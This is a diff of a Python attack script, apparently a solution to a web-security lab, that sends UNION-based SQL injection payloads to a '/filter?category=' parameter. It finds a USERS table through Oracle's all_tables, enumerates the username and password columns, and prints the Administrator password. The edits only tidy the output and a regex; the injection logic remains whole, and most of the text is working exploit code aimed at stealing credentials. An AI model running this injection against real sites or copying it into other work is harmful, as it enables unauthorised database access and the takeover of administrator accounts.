@@ -3,12 +3,11 @@ import requests
 from bs4 import BeautifulSoup
 import re
 
-
 def find_users_table(url):
     try:
         response = requests.get(f"{url}/filter?category=' UNION SELECT table_name, NULL FROM all_tables--")
         soup = BeautifulSoup(response.text, 'html.parser')
-        users_table = soup.find(string=re.compile('^USERS\_.*'))
+        users_table = soup.find(string=re.compile('^USERS_.*'))
 
         if users_table:
             return users_table
@@ -43,15 +42,13 @@ def main():
         sys.exit(1)
 
     url = sys.argv[1].rstrip("/")
-    print("Enumerating the name of the users table...")
+
     users_table = find_users_table(url)
-    print(f"Users table name is: {users_table}\n")
+    print(f"Users table: {users_table}")
 
-    print("Enumerating username and password columns...")
     username_column, password_column = get_column_names(url, users_table)
-    print(f"Username column: {username_column}, Password column: {password_column}\n")
+    print(f"Username column: {username_column}\nPassword column: {password_column}")
 
-    print("Retrieving Administrator password...")
     admin_password = get_admin_password(url, users_table, username_column, password_column)
     print(f"Administrator password: {admin_password}")
 
